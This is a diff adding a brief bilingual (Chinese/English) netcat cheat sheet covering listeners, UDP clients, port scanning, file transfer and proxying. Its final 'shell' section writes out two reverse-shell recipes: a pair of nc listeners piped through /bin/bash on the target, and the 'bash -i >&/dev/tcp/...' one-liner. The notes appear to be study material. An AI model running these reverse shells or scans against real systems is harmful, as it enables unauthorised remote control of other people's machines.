@@ -1,0 +1,40 @@
+-n : ban dns
+
+-w "seconds"
+
+-e：已经凉了 
+
+
+
+1 tcp udp :
+	tcp :
+		s : nc -s "listen_ip" -lvp "listen_port"
+		c : nc "listen_ip" "listen_port"
+	udp :
+		s : nc -s "listen_ip" -lvp "listen_port" -u
+		c : echo "user data" | nc "listen_ip" "listen_port" -u
+
+2 port scan :
+	tcp : nc -zv "ip of want to scan" "port of want to scan(also like '1-100' to range scan)"
+	udp : add -u but no info
+	// 从原理上将我们可以通过利用tcp的三次握手观察tcp端口是否开放，但是udp呢？
+
+3 file trans :
+	use tcp nomally :
+		s : nc -s "listen_ip" -lvp "listen_port" > filename
+		c : nc "listen_ip" "listen_port" < filename
+
+4 proxy :
+    如何使用nc设置一台proxy server？nc -s "listen_ip" -lvp "listen_port" | nc "listen_ip" "listen_port"
+    nc客户端如何使用代理proxy？nc -x <proxy_host>:<proxy_port> <destination_host> <destination_port>
+
+5 shell :
+（1）靠谱：
+	first : in two contol host, start two nc tcp server, one on duty to input, and one on duty to output.
+		s1 : nc -s "listen_ip_input" -lvp "listen_port_input"
+		s2 : nc -s "listen_ip_output" -lvp "listen_port_output"
+	second : in target.
+		nc "listen_ip_input" "listen_port_input" | /bin/bash | nc "listen_ip_output" "listen_port_output"
+（2）不靠谱
+	control：nc -s ip-addr -lvp port-num
+	target：bash -i >&/dev/tcp/ip-addr/port-num 0>&1
